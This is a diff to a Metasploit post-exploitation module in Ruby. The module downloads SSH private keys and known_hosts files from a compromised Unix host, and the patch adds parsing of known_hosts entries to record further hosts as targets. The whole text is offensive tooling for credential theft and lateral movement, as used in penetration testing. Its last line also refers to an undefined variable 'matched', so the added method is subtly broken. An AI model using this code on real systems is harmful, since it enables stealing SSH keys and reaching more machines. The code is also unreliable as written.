@@ -6,6 +6,8 @@
 require 'net/ssh'
 
 class MetasploitModule < Msf::Post
+  LOOPBACK_ADDRS = ['localhost', '127.0.0.1', '::1'].freeze
+
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -40,6 +42,12 @@ class MetasploitModule < Msf::Post
           'Reliability' => []
         }
       )
+    )
+
+    register_options(
+      [
+        OptBool.new('PARSE_KNOWN_HOSTS', [false, 'Parse plaintext known_hosts entries and store as workspace hosts', true])
+      ]
     )
   end
 
@@ -100,8 +108,11 @@ class MetasploitModule < Msf::Post
         loot_path = store_loot("ssh.#{file.tr('.', '_')}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
         print_good("Downloaded: #{file_path} -> #{loot_path}")
 
-        # store only ssh private keys
-        store_ssh_key(data, user, file)
+        if file == 'known_hosts'
+          parse_known_hosts(data) if datastore['PARSE_KNOWN_HOSTS']
+        else
+          store_ssh_key(data, user, file)
+        end
       end
     end
   end
@@ -132,5 +143,32 @@ class MetasploitModule < Msf::Post
     rescue StandardError => e
       print_warning("Could not parse SSH private key in #{filename}: #{e.message}")
     end
+  end
+
+  def parse_known_hosts(data)
+    hosts_found = 0
+
+    data.each_line do |line|
+      line.strip!
+      next if line.empty? || line.start_with?('#')
+      next if line.start_with?('|') # hashed entries (|1|...) cannot be reversed
+
+      hosts_field = line.split(' ').first
+      next unless hosts_field
+
+      hosts_field.split(',').each do |entry|
+        host = entry.gsub(/\A\[/, '').gsub(/\]:\d+\z/, '') # strip [host]:port brackets
+        next if host.empty?
+
+        hosts_found += 1
+
+        resolved = LOOPBACK_ADDRS.include?(host) ? session.session_host : host
+        vprint_good("Found host in known_hosts: #{host}#{" (#{resolved})" if resolved != host}")
+        report_host(host: resolved, info: 'Discovered via SSH known_hosts')
+      end
+    end
+
+    msg = "Parsed #{hosts_found} host #{'entry'.pluralize(hosts_found)} from known_hosts"
+    matched > 0 ? print_status(msg) : vprint_status(msg)
   end
 end
